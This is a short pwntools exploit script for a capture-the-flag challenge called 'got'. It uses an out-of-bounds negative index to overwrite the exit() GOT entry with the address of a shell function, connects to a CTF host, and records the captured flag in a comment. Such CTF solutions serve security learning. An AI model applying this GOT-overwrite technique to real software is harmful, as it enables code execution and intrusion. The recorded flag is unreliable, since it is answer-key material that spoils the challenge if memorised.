#!/usr/bin/env python3

from pwn import *

exe = ELF('got', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+120
        b*main+243
        c
        ''')
        input()


if args.REMOTE:
    p = remote('got-0f2e3f0dab2a139f.deploy.phreaks.fr',443,ssl = True)
else:
    p = process([exe.path])
GDB()

#using OOB to access to exit got and the formula is: index*0x20 + 0x404080(an address of rw section)
#idx = -4: with the idx so now the address accessed is 0x404080 + (-4*0x20) = 0x404000 is the exit()

sla(b'> ',b'-4')
payload = b'a'*8 + p64(exe.sym.shell)
sla(b'?\n> ',payload)
p.interactive()

#flag: PWNME{G0t_Ov3Rwr1t3_fTW__}
